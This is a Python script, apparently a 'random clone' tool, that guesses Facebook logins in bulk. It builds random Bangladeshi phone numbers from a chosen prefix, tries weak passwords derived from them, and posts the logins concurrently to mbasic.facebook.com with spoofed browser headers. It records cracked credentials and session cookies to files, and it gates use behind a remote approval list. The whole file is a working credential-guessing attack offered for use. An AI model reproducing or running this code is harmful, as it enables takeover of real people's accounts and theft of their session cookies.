import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
li="\033[38;5;46m—"

cox=str(f"{li}"*37)        
logo = ("""
  _   _                                 
 | \ | |                                
 |  \| | __ _ _   _  ___  ___ _ __ ___  
 | . ` |/ _` | | | |/ _ \/ _ \ '_ ` _ \ 
 | |\  | (_| | |_| |  __/  __/ | | | | |
 |_| \_|\__,_|\__, |\___|\___|_| |_| |_|
               __/ |                    
              |___/                                   
\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗡𝗔𝗬𝗘𝗘𝗠""")
logo1 = ("""
\033[38;5;46m███    ██  \x1b[38;5;196m█████   \033[33;1m██    ██  \033[31;1m ███████  \033[35;1m ███████ \x1b[38;5;196m ███    ███ 
\033[38;5;46m████   ██ \x1b[38;5;196m██   ██   \033[33;1m██  ██   \033[31;1m ██        \033[35;1m██      \x1b[38;5;196m ████  ████ 
\033[38;5;46m██ ██  ██ \x1b[38;5;196m███████    \033[33;1m████    \033[31;1m █████     \033[35;1m█████    \x1b[38;5;196m██ ████ ██ 
\033[38;5;46m██  ██ ██ \x1b[38;5;196m██   ██    \033[33;1m ██      \033[31;1m██       \033[35;1m ██      \x1b[38;5;196m ██  ██  ██ 
\033[38;5;46m██   ████ \x1b[38;5;196m██   ██     \033[33;1m██     \033[31;1m ███████   \033[35;1m███████  \x1b[38;5;196m██      ██ 
 \033[1;91m┏━━━━━━━━━━━\033[1;93m━━━━━━━━━━\033[1;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 \033[1;91m┃ \033[1;92m┏━━━━━━━━━━>\033[1;96m 999+GANG BD \033[1;92m<━━━━━━━━━┓ \033[1;91m1┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┏━━━━━━━\033[1;92m━━━━━━━━━\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━┓ \033[1;92mH┃ \033[1;91m2┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] AUTHOR   \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mNAYEEM NAWAZ         \033[1;93mA┃ \033[1;92mI┃ \033[1;91m3┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] TOOL     \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mRANDOM CLONE           \033[1;93mB┃ \033[1;92mJ┃ \033[1;91m4┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] TOOL NUM \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92V23                     \033[1;93mC┃ \033[1;92mK┃ \033[1;91m5┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] STATUS   \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mFREE                   \033[1;93mD┃ \033[1;92mK┃ \033[1;91m6┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] VERSION  \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92m8.2                    \033[1;93mE┃ \033[1;92mK┃ \033[1;91m7┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] SYSTEM   \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mDATA & WIFI            \033[1;93mF┃ \033[1;92mL┃ \033[1;91m8┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] NETWORK  \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92m3G - 4G -5G            \033[1;93mG┃ \033[1;92mM┃ \033[1;91m9┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] FACEBOOK \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mNAYEEM NAWAZ           \033[1;93mH┃ \033[1;92mN┃ \033[1;91mA┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] GITHUB   \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mNayeem999+             \033[1;93mI┃ \033[1;92mP┃ \033[1;91mB┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] WHATSAPP \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92m+8801827673253         \033[1;93mJ┃ \033[1;92mQ┃ \033[1;91mC┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┗━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;92m━━━━━━━━━\033[1;93m━━━━━━━┛ \033[1;92mR┃ \033[1;91mD┃
 \033[1;91m┃ \033[1;92m┗━━━━━> \033[1;96mFB-Nayeem Nawaz\033[1;92m<━━━━━━┛ \033[1;91m┃
 \033[1;91m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;93m━━━━━━━━━━\033[1;91m━━━━━━━━━━━━━┛𝗡𝗔𝗬𝗘𝗘𝗠}""")

def Nayeemx():
	print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗡𝗔𝗬𝗘𝗘𝗠')

def Main():
        os.system("clear")
        print(logo)
        print(" [\033[38;5;46m𝗡𝗔𝗬𝗘𝗘𝗠𝟬𝟭] 𝗥𝗔𝗡𝗗𝗢𝗠 𝗕𝗗")
        print(" [\033[38;5;46m𝗖𝗬𝗕𝗘𝗥 999+] 𝗙𝗨𝗖𝗞 𝗬𝗢𝗨")
        Nayeem =input("\n [\033[38;5;46m]𝗖𝗛𝗢𝗜𝗖𝗘  : ")
        if Nayeem in ["NAYEEM01"]:
            fuck()
        if Nayeem in [" CYBER 999+", "00"]:
            exit()
        else:
            exit()
            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗡𝗔𝗬𝗘𝗘𝗠')
    print('[\033[38;5;46m]𝗦𝗜𝗠𝗘 𝗖𝗢𝗗𝗘 : 017, 018, 019, 016')
    code = input('[\033[38;5;46m[𝗘𝗛𝗖] 𝗖𝗛𝗢𝗜𝗖𝗘 : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('[\033[38;5;46m]𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : 2000 3000 5000 10000 ')
    limit = int(input('[\033[38;5;46m𝗡𝗔𝗬𝗘𝗘𝗠] 𝗖𝗛𝗢𝗜𝗖𝗘 : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo1)
        tl = str(len(user))
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════')
        print('[\033[38;5;46m𝗡𝗔𝗬𝗘𝗘𝗠\x1b[38;5;196m 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 \033[34;1m𝗜𝗗: '+tl)
        print("[\033[38;5;46m𝗡𝗔𝗬𝗘𝗘𝗠\033[37;1m 𝗦𝗜𝗠𝗘 \x1b[38;5;196m𝗖𝗢𝗗𝗘: "+code)
        print('[\033[38;5;46m \033[38;5;46m𝗪𝗢𝗥𝗞\x1b[38;5;196m 𝗪𝗜𝗙𝗜\033[34;1m 𝗗𝗔𝗧𝗔')
        print('[\033[38;5;46m999+ \x1b[38;5;196mFREE \033[34;1m𝗖𝗢𝗠𝗠𝗔𝗡𝗗')
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            yaari.submit(emran2,uid,pwx,tl)
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════')
    print(' [\033[38;5;46m999+] Crack process has been completed')
    print(' [\033[38;5;46m𝗖𝗬𝗕𝗘𝗥 999+] OK Ids saved in NAYEEM/OK.txt')
    print(' [\033[38;5;46m𝗡𝗔𝗬𝗘𝗘𝗠] CP Ids s═════aved in NAYEEM/CP.txt')
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════')
def emran2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[38;5;46m〱NAYEEM〱%s/%s〱𝗟𝗢𝗖𝗞-𝗜𝗗 𝗕𝗥𝗢😓%s➲〱𝗢𝗞_𝗜𝗗 𝗕𝗥𝗢🌺%s\r'%(loop,tl,len(cps),len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
#_________𝗨𝗣𝗗𝗔𝗧𝗘 𝗦𝗬𝗦𝗧𝗘𝗠➻➲🥰🥰        
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'path': '/login/device-based/login/async/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'dpr': '2.75',
            'referer': 'https://mbasic.facebook.com/?stype=lo&deoia=1&jlou=Afc3DOEookgiUqyKkSutf7vhVBBH5uBe0mxxivTeds-2HHJ51g3zCPlwuTcl5CG9pdSXDq7tlqd7gQBf5YqLlw_gY2OsHAUp1lqQhI2i87EbPg&smuh=15321&lh=Ac8J7HWQJBF-iySIHO0&wtsid=rdr_1A7AQA3AIlsfquwe9&_rdr',
            'sec-ch-ua': '"Google Chrome";v="112", "Chromium";v="112", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; RMX3085) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            'viewport-width': '980',
}

            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text           
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
#_________𝗢𝗞_𝗜𝗡_𝗙𝗥𝗢---➲👇👇
#__________𝗢𝗞✅-𝗜𝗗-------➲🥰🥰       
                print(f"""
    \033[33;1m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 -------➲   \x1b[38;5;196m𝙉𝙐𝙈𝘽𝙀𝙍-------➲\033[38;5;46m{uid} 
    \033[33;1m𝙁𝗔𝘾𝙀𝘽𝙊𝙊𝙆-------➲   \x1b[38;5;196m𝙋𝘼𝙎𝙎𝙒𝘿-------➲\033[38;5;46m{ps}
\033[33;1m𝘾𝙊𝙊𝙆𝙀𝙎(𝗢𝗞✓)\033[38;5;46m{coki}
""")
                open('/sdcard/NAYEEM/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
 #_________𝗖𝗣_𝗜𝗡_𝗙𝗥𝗢---➲👇👇
#__________𝗟𝗢𝗖𝗞-𝗜𝗗------➲😓😓
                print(f"""
\033[31;1m𝗟𝗢𝗖𝗞-𝗜𝗗➲😓😓-------➲  \033[38;5;46m𝙉𝙐𝙈𝘽𝙀𝙍-------➲\033[38;5;46m{uid} 
\033[31;1m𝗟𝗢𝗖𝗞-𝗜𝗗➲😓😓-------➲  \033[38;5;46m𝙋𝘼𝙎𝙎𝙒𝘿-------➲\033[38;5;46m{ps}
""")
                open('/sdcard/NAYEEM-𝗟𝗢𝗖𝗞-𝗜𝗗➲😓✓-𝗜𝗗.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass
import os,httpx
def approval():
	frist="=["
	last="]="
	uuid=str(os.getuid()) + str(os.getlogin())
	key = "6".join(uuid)
	ress=httpx.get("https://raw.githubusercontent.com/nayeemex/new/main/approve.txt").text
	if key in ress:
		fuck()
	else:
		print("YOUR KEY IS NOT APPROVED")
		os.system("clear")
		print("THIS TOOL.IS FREE BUT YOU NEED PERMITION TO USE IT")
		print("Your key : "+frist+key+last)
		print("=======================")
		name = input("YOUR NAME ")
		os.system("xdg-open https://www.facebook.com/nayeem0988?mibextid=ZbWKwL")
approval()